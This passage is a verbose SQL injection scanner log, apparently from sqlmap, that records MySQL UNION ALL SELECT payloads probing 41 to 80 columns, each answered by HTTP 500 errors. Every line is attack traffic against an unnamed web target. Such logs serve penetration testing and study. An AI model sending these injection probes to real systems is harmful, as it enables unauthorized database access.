+[21:20:30] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:30] [PAYLOAD] -6819' UNION ALL SELECT 5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975,5975#
+[21:20:30] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:30] [PAYLOAD] -9468' UNION ALL SELECT 7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099,7099#
+[21:20:30] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:31] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[21:20:31] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:31] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:31] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:31] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:31] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:31] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:31] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:32] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:32] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:32] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:32] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:32] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:32] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:32] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:32] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:33] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:33] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:33] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:33] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:33] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:33] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:34] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:34] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:34] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:34] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:34] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:34] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:34] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:34] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:35] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:35] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:35] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:35] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:35] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:35] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:36] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:36] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:36] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[21:20:36] [PAYLOAD] -7238' UNION ALL SELECT 4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161,4161#
+[21:20:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:37] [PAYLOAD] -9049' UNION ALL SELECT 2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081,2081#
+[21:20:37] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:37] [PAYLOAD] -2918' UNION ALL SELECT 9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559,9559#
+[21:20:37] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:37] [PAYLOAD] -2184' UNION ALL SELECT 7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327,7327#
+[21:20:37] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:37] [PAYLOAD] -5430' UNION ALL SELECT 1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149,1149#
+[21:20:38] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:38] [PAYLOAD] -5068' UNION ALL SELECT 6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629,6629#
+[21:20:38] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:38] [PAYLOAD] -6061' UNION ALL SELECT 1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580,1580#
+[21:20:38] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:38] [PAYLOAD] -7218' UNION ALL SELECT 6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239,6239#
+[21:20:39] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:39] [PAYLOAD] -2874' UNION ALL SELECT 5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082,5082#
+[21:20:39] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:39] [PAYLOAD] -7061' UNION ALL SELECT 5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704,5704#
+[21:20:39] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:39] [PAYLOAD] -7149' UNION ALL SELECT 1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823,1823#
+[21:20:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:40] [PAYLOAD] -4031' UNION ALL SELECT 2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072,2072#
+[21:20:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:40] [PAYLOAD] -7126' UNION ALL SELECT 6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352,6352#
+[21:20:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:40] [PAYLOAD] -1203' UNION ALL SELECT 4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394,4394#
+[21:20:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:40] [PAYLOAD] -6618' UNION ALL SELECT 5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714,5714#
+[21:20:41] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:41] [PAYLOAD] -7627' UNION ALL SELECT 9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554,9554#
+[21:20:41] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:41] [PAYLOAD] -2307' UNION ALL SELECT 2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592,2592#
+[21:20:41] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:41] [PAYLOAD] -1311' UNION ALL SELECT 2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233,2233#
+[21:20:42] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:42] [PAYLOAD] -7373' UNION ALL SELECT 6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126,6126#
+[21:20:42] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:42] [PAYLOAD] -9036' UNION ALL SELECT 5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841,5841#
+[21:20:42] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:42] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[21:20:42] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:43] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:43] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:44] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:44] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:44] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:44] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:45] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:45] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:45] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:45] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:45] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:45] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:46] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:46] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:20:46] [PAYLOAD] test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+[21:20:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
